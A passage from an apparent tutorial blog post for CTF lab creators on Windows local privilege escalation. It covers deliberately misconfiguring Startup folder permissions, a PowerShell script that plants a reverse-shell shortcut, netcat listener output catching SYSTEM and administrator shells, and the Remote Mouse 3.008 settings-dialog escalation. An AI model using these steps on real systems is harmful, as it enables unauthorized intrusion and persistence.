+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">shutdown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">t</span> <span class="mf">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As expected we escalated our privileges from a default user to <code>NT AUTHORITY\SYSTEM</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.119.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.119.129<span class="o">]</span> <span class="m">49670</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.493<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami /all
+</span></span><span class="line"><span class="cl">whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name           <span class="nv">SID</span>
+</span></span><span class="line"><span class="cl"><span class="o">===================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem S-1-5-18
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                             Type             SID          <span class="nv">Attributes</span>
+</span></span><span class="line"><span class="cl"><span class="o">======================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
+</span></span><span class="line"><span class="cl">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\S</span>ystem Mandatory Level Label            S-1-16-16384
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-startup-applications">Privilege Escalation via Startup Applications</h1>
+<p>Run a command prompt or PowerShell console as an administrator and grant full permissions to the startup directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">icacls</span> <span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span> <span class="p">/</span><span class="n">grant</span> <span class="s2">&#34;BUILTIN\Users:F&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">processed</span> <span class="n">file</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="nb">Start </span><span class="n">Menu</span><span class="p">\</span><span class="n">Programs</span><span class="p">\</span><span class="n">Startup</span>
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Verify that the permissions have been applied:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">icacls</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="nb">Start </span><span class="n">Menu</span><span class="p">\</span><span class="n">Programs</span><span class="p">\</span><span class="n">Startup</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">264094270</span><span class="p">-</span><span class="mf">2388996790</span><span class="p">-</span><span class="mf">3434637240</span><span class="p">-</span><span class="mf">1000</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">DE</span><span class="p">,</span><span class="n">DC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="nb">DESKTOP-BN</span><span class="p">\</span><span class="n">user</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">DE</span><span class="p">,</span><span class="n">DC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="nb">DESKTOP-BN</span><span class="p">\</span><span class="n">Administrator</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">DE</span><span class="p">,</span><span class="n">DC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                             <span class="n">Everyone</span><span class="err">:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Successfully</span> <span class="n">processed</span> <span class="mf">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mf">0</span> <span class="n">files</span>  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see, the <code>Users</code> group can write to the Startup directory. Therefore, we can create a malicious binary or implant and place it in that directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$WshShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-comObject</span> <span class="n">WScript</span><span class="p">.</span><span class="py">Shell</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Shortcut</span> <span class="p">=</span> <span class="nv">$WshShell</span><span class="p">.</span><span class="py">CreateShortcut</span><span class="p">(</span><span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Shortcut</span><span class="p">.</span><span class="py">TargetPath</span> <span class="p">=</span> <span class="s2">&#34;C:\Tools\reverse.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Shortcut</span><span class="p">.</span><span class="py">Save</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In a low-privileged user (default user) command prompt or PowerShell console, execute the script:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;C:\Tools\CreateShortcut.ps1&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check if the shortcut was created:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.lnk&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="nb">Start </span><span class="n">Menu</span><span class="p">\</span><span class="n">Programs</span><span class="p">\</span><span class="n">Startup</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">----</span>          <span class="mf">3</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2022</span>   <span class="mf">4</span><span class="err">:</span><span class="mf">41</span> <span class="n">PM</span>            <span class="mf">611</span> <span class="n">reverse</span><span class="p">.</span><span class="py">lnk</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Start a listener on the attacker host and then simulate an Administrator login using RDP. After a while, we should receive a shell running as an administrator:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.119.130<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.119.129<span class="o">]</span> <span class="m">49898</span>
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.493<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami /all
+</span></span><span class="line"><span class="cl">whoami /all
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">USER INFORMATION
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User Name                     <span class="nv">SID</span>
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">============================================</span>
+</span></span><span class="line"><span class="cl">desktop-bn<span class="se">\a</span>dministrator S-1-5-21-264094270-2388996790-3434637240-500
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GROUP INFORMATION
+</span></span><span class="line"><span class="cl">-----------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Group Name                                                    Type             SID          <span class="nv">Attributes</span>                                         
+</span></span><span class="line"><span class="cl"><span class="o">=============================================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\P</span>erformance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\U</span>sers                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\I</span>NTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\T</span>his Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\L</span>ocal account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level                          Label            S-1-16-12288                                                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-insecure-gui-applications">Privilege Escalation via Insecure GUI Applications</h1>
+<p>The application <a href="https://www.exploit-db.com/exploits/50047" target="_blank" rel="noopener noreffer ">Remote Mouse GUI version 3.008</a> is vulnerable to a local privilege escalation technique, which is the ability to open any binary as administrator, this includes a terminal/console. The author specifies the steps to reproduce:</p>
+<blockquote>
+<ol>
+<li>Open Remote Mouse from the system tray</li>
+<li>Go to &ldquo;Settings&rdquo;</li>
+<li>Click &ldquo;Change&hellip;&rdquo; in &ldquo;Image Transfer Folder&rdquo; section</li>
+<li>&ldquo;Save As&rdquo; prompt will appear</li>
+<li>Enter &ldquo;C:\Windows\System32\cmd.exe&rdquo; in the address bar</li>
+<li>A new command prompt is spawned with Administrator privileges</li>
+</ol>
+</blockquote>
+<p>We&rsquo;ll do those steps once we install the application. We&rsquo;ll <a href="https://www.exploit-db.com/apps/4e06b0e24ad2dbf6fde0da11b77dd98d-RemoteMouse.exe" target="_blank" rel="noopener noreffer ">download</a> the application, install it and then run it:</p>
+<p>![[uac-remote-mouse.png]]</p>
+<figure><a class="lightgallery" href="/images/posts/uac-remote-mouse.png" title="/images/posts/uac-remote-mouse.png" data-thumbnail="/images/posts/uac-remote-mouse.png" data-sub-html="<h2>UAC Remote Mouse</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/uac-remote-mouse.png"
+            data-srcset="/images/posts/uac-remote-mouse.png, /images/posts/uac-remote-mouse.png 1.5x, /images/posts/uac-remote-mouse.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/uac-remote-mouse.png" />
+    </a><figcaption class="image-caption">UAC Remote Mouse</figcaption>
+    </figure>
+<p>Open the program from the system tray:</p>
+<figure><a class="lightgallery" href="/images/posts/mouse-open.png" title="/images/posts/mouse-open.png" data-thumbnail="/images/posts/mouse-open.png" data-sub-html="<h2>Mouse Open</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/mouse-open.png"
+            data-srcset="/images/posts/mouse-open.png, /images/posts/mouse-open.png 1.5x, /images/posts/mouse-open.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/mouse-open.png" />
+    </a><figcaption class="image-caption">Mouse Open</figcaption>
+    </figure>
+<p>Then click on the <code>Settings</code> tab and from there click on the <code>&quot;Change...&quot;</code> button in the &ldquo;<code>Image Transfer Folder</code>&rdquo; section</p>
+<figure><a class="lightgallery" href="/images/posts/remote-mouse-settings.png" title="/images/posts/remote-mouse-settings.png" data-thumbnail="/images/posts/remote-mouse-settings.png" data-sub-html="<h2>Remote Mouse Settings</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/remote-mouse-settings.png"
+            data-srcset="/images/posts/remote-mouse-settings.png, /images/posts/remote-mouse-settings.png 1.5x, /images/posts/remote-mouse-settings.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/remote-mouse-settings.png" />
+    </a><figcaption class="image-caption">Remote Mouse Settings</figcaption>
+    </figure>
+<p>Enter &ldquo;<code>C:\Windows\System32\cmd.exe</code>&rdquo; in the address bar:</p>
+<figure><a class="lightgallery" href="/images/posts/open-cmd-right.png" title="/images/posts/open-cmd-right.png" data-thumbnail="/images/posts/open-cmd-right.png" data-sub-html="<h2>Open CMD Settings</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/open-cmd-right.png"
+            data-srcset="/images/posts/open-cmd-right.png, /images/posts/open-cmd-right.png 1.5x, /images/posts/open-cmd-right.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/open-cmd-right.png" />
+    </a><figcaption class="image-caption">Open CMD Settings</figcaption>
+    </figure>
+<p>As the author describes, a new command prompt is spawned with <strong>System</strong> privileges:</p>
+<figure><a class="lightgallery" href="/images/posts/cmd-as-admin%201.png" title="/images/posts/cmd-as-admin 1.png" data-thumbnail="/images/posts/cmd-as-admin 1.png" data-sub-html="<h2>CMD as Administrator</h2>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/posts/cmd-as-admin%201.png"
+            data-srcset="/images/posts/cmd-as-admin%201.png, /images/posts/cmd-as-admin%201.png 1.5x, /images/posts/cmd-as-admin%201.png 2x"
+            data-sizes="auto"
+            alt="/images/posts/cmd-as-admin 1.png" />
+    </a><figcaption class="image-caption">CMD as Administrator</figcaption>
+    </figure>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/applications/">Applications</a>,&nbsp;<a href="/tags/insecure-gui-applications/">Insecure Gui Applications</a>,&nbsp;<a href="/tags/insecure-startup-applications/">Insecure Startup Applications</a>,&nbsp;<a href="/tags/insecure-applications-permissions/">Insecure Applications Permissions</a>,&nbsp;<a href="/tags/vulnerable-applications/">Vulnerable Applications</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/windows-privesc-credential-hunting/" class="prev" rel="prev" title="Windows Local Privilege Escalation - Credential Hunting for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Windows Local Privilege Escalation - Credential Hunting for CTF Creators</a>
+            <a href="/windows-privesc-services/" class="next" rel="next" title="Windows Local Privilege Escalation - Services for CTF Creators">Windows Local Privilege Escalation - Services for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
